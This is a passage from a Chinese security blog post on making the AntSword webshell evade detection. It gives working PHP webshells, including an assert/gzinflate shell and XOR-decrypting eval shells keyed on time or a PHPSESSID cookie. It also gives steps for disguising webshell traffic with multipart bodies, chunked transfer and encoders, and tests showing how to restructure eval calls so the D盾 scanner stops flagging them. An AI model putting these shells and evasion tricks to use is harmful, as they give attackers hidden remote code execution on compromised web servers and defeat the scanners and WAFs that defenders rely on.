<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728153806619.png" alt="image-20200728153806619"></p>
<p>所以我们只要对这部分进行修改就可以了，我们要确保这个符号不会在返回包的内容中出现，我这里随便取了个@#来作为分割符。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728154120506.png" alt="image-20200728154120506"></p>
<p>同样，我们要在蚁剑的custom shell中进行相应的修改。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728154150241.png" alt="image-20200728154150241"></p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728154202049.png" alt="image-20200728154202049"></p>
<p>然后就可以正常的使用了</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728154219306.png" alt="image-20200728154219306"></p>
<p>关于custom模式，还有第二个特性，就是关于传入的参数的参数名，z0,z1,z2等等，这个也算一个特征把，所以我们也需要把它处理一下，这个同样需要在shell和蚁剑同时处理，我在php的custom shell中找到了如下代码</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728160653504.png" alt="image-20200728160653504"></p>
<p>所以我们需要把这几个参数改成比较正常的参数名。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728162411446.png" alt="image-20200728162411446"></p>
<p>然后需要在蚁剑中找到这部分代码进行处理，这个处理就比较麻烦些，因为在好几个文件中都出现了。然后我分别在如下的几个文件中做了处理。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">source\core\custom\template\database\default.js</span><br><span class="line">source\core\custom\template\command.js</span><br><span class="line">source\core\custom\template\filemanager.js</span><br></pre></td></tr></table></figure>

<p>处理后效果如下：</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728162553173.png" alt="image-20200728162553173"></p>
<h4 id="流量免杀"><a href="#流量免杀" class="headerlink" title="流量免杀"></a>流量免杀</h4><p>最后我们来学学流量混淆这部分，其实这里一方面是运用各种加密解密来对流量进行混淆，另一方面就是使用一些蚁剑本身提供的特性来进行混淆。</p>
<h5 id="方法一：更改post的格式为Multipart"><a href="#方法一：更改post的格式为Multipart" class="headerlink" title="方法一：更改post的格式为Multipart"></a>方法一：更改post的格式为Multipart</h5><p>我们如果之前简单了解过一些绕WAF的技巧，我们就知道有些WAF针对于不同的请求类型的拦截规则是不一样的，大多数的WAF会对GET类型的请求拦截非常严格，但是对于POST会弱一些，有时候假如我们改变了请求体的方式为Multipart，有些WAF甚至只会检测文件上传漏洞，所以呢，可以通过这个特性来进行简单的绕过。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728155455601.png" alt="image-20200728155455601"></p>
<p>设置后的效果如下：</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728155629444.png" alt="image-20200728155629444"></p>
<h5 id="方法二：分块传输"><a href="#方法二：分块传输" class="headerlink" title="方法二：分块传输"></a>方法二：分块传输</h5><p>之前别人公开了分块传输绕WAF的方法后，后来做项目中遇到不少WAF都可以直接通过分块传输绕过。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728155810488.png" alt="image-20200728155810488"></p>
<p>这里我设置好并刷新了下缓存，然后在burp上查看发包的这个过程，比较奇怪的是并没有发现分块传输的迹象。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728160222681.png" alt="image-20200728160222681"></p>
<p>不过有老哥已经写了burp的分块传输的插件，我们可以将蚁剑的流量代理到burp上，再使用分块插件进行分块，嗯，真香。</p>
<p>蚁剑中设置：</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728163023441.png" alt="image-20200728163023441"></p>
<p>burp插件中设置：</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728163044919.png" alt="image-20200728163044919"></p>
<p>然后就可以分块了。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728163127083.png" alt="image-20200728163127083"></p>
<h5 id="方法三：各种编码解码器"><a href="#方法三：各种编码解码器" class="headerlink" title="方法三：各种编码解码器"></a>方法三：各种编码解码器</h5><p>蚁剑作者给了很多编解码器，地址：<a href="https://github.com/AntSwordProject/AwesomeEncoder" target="_blank" rel="noopener">https://github.com/AntSwordProject/AwesomeEncoder</a></p>
<p><strong>zlib</strong></p>
<p>在这个编码器里面也有关于如何去处理shell的提示</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728165427727.png" alt="image-20200728165427727"></p>
<p>我将之前测试免杀D盾的shell稍微改了一下就可以了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a&#x3D;&quot;assert&quot;;</span><br><span class="line">$c&#x3D;$_POST[&#39;ant&#39;];</span><br><span class="line">$d&#x3D;base64_decode($c);</span><br><span class="line">$e&#x3D;gzinflate($d);</span><br><span class="line">$b&#x3D;array(&#39;&#39;&#x3D;&gt;$a($e));</span><br><span class="line">uksort($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>最后效果如下:</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728165614745.png" alt="image-20200728165614745"></p>
<p><strong>动态密钥</strong></p>
<p>因为之前有人分析冰蝎的加密，得出可以通过获取密钥的那个数据包来对冰蝎的指纹进行识别，所以yzddmr6前辈为了写了两款关于动态密钥的编码器，一个是基于时间生成密钥的，还有一个是通过随机cookie来生成的，我们都学习一下吧。</p>
<p><strong>基于时间的动态密钥</strong></p>
<p>我们跟着代码稍微学习一下，下面这段代码是比较简单和，和蚁剑自带的编码器代码没有什么区别，主要的操作在xor函数里。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728174216362.png" alt="image-20200728174216362"></p>
<p>跟进到xor函数里，函数里获取了当前的时间，并调用switch对时间的格式进行处理，switch这个函数是自定义的处理函数。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728174601774.png" alt="image-20200728174601774"></p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728174701365.png" alt="image-20200728174701365"></p>
<p>使用格式化后的time的md5值作为key,对payload进行异或处理。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728174910075.png" alt="image-20200728174910075"></p>
<p>要使用这个编码器我们需要对我们的shell做一定的处理，需要在shell中加入解密的逻辑代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">date_default_timezone_set(&quot;PRC&quot;);</span><br><span class="line">@$post&#x3D;base64_decode($_REQUEST[&#39;yzddmr6&#39;]);</span><br><span class="line">$key&#x3D;md5(date(&quot;Y-m-d H:i&quot;,time()));</span><br><span class="line">for($i&#x3D;0;$i&lt;strlen($post);$i++)&#123;</span><br><span class="line">    $post[$i] &#x3D; $post[$i] ^ $key[$i%32];</span><br><span class="line">&#125;</span><br><span class="line">eval($post);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>最后数据包是这样的</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728175747960.png" alt="image-20200728175747960"></p>
<p>base64解码后也是看不到明文内容的</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728175815387.png" alt="image-20200728175815387"></p>
<p><strong>基于cookie的动态密钥</strong></p>
<p>这种方法生成26位的随机字符放在了cookie的PHPSESSID中，设置方法基于时间的差不多，最后效果如下：</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728180915972.png" alt="image-20200728180915972"></p>
<p>这里yzddmr6前辈还给出了一个免杀的shell，我们分析下这个shell为什么就能免杀D盾</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Cookie</span><br><span class="line">&#123;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $key&#x3D;@$_COOKIE[&#39;PHPSESSID&#39;];</span><br><span class="line">        @$post&#x3D;base64_decode($_REQUEST[&#39;test&#39;]);</span><br><span class="line">        for($i&#x3D;0;$i&lt;strlen($post);$i++)&#123;</span><br><span class="line">            $post[$i] &#x3D; $post[$i] ^ $key[$i%26];</span><br><span class="line">        &#125;</span><br><span class="line">        return $post;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;return @eval($this-&gt;__construct());&#125;</span><br><span class="line">&#125;</span><br><span class="line">$check&#x3D;new Cookie();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>我基本把代码都删完了，发现当仅仅留下下面这段代码的时候D盾是会爆1级的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;return @eval($this-&gt;__construct());&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728181601624.png" alt="image-20200728181601624"></p>
<p>然后前面加个函数名就不会杀了。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728181726799.png" alt="image-20200728181726799"></p>
<p>而且当直接调用eval($this)会升到4级，但是使用$this-&gt;__construct()这种形式就少了很多。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728181848146.png" alt="image-20200728181848146"></p>
<p>再测试了下，当参数中有-&gt;等级会下降很多，再加上参数+括号就不报了。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728182041283.png" alt="image-20200728182041283"></p>
<p><strong><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728182102746.png" alt="image-20200728182102746"></strong></p>
<p>所以对于其他敏感函数的拦截我们是不是也可以通过这种调用的方式绕过D盾的拦截。</p>
<p>我使用assert再进行了测试，直接这样绕是会爆一级的，但是在这个代码前加上其他函数就不杀了，所以我们又学到一个小技巧，就是可以把我们代码执行的函数放在其他函数的后面。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728182629591.png" alt="image-20200728182629591"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过对蚁剑免杀的学习，终于明白为什么我的shell总会被杀了，所以深入了解一个工具是非常有必要的。</p>
<p>参考文章：</p>
<p><a href="https://yzddmr6.tk/posts/antsword-xor-encoder-2/" target="_blank" rel="noopener">基于随机Cookie的蚁剑动态秘钥编码器</a></p>
<p><a href="https://yzddmr6.tk/posts/antsword-xor-encoder/" target="_blank" rel="noopener">蚁剑实现动态秘钥编码器解码器</a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzI0MDI5MTQ3OQ==&mid=2247483852&idx=1&sn=3cd3f667523550d414fad97231eeeaea&chksm=e91c5a34de6bd3223f5c3e69aa12311be39d4c13ee8d222ddb81f97070c74698dc7ae7fcecba&mpshare=1&scene=23&srcid&sharer_sharetime=1572778022447&sharer_shareid=3bdf1b0c76d4c1691e700c57f87d9c0a%23rd" target="_blank" rel="noopener">蚁剑绕WAF进化图鉴</a></p>
<p><a href="https://xz.aliyun.com/t/4000#toc-4" target="_blank" rel="noopener">从静态到动态打造一款免杀的antSword(蚁剑)</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

  </div>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let activeClass = CONFIG.comments.activeClass;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">藏青</p>
  <div class="site-description" itemprop="description">知行合一</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">39</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">10</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">16</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">藏青</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.0
  </div>
  <span class="post-meta-divider">|</span>
  <div class="theme-info">Theme – <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.7.1
  </div>

    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
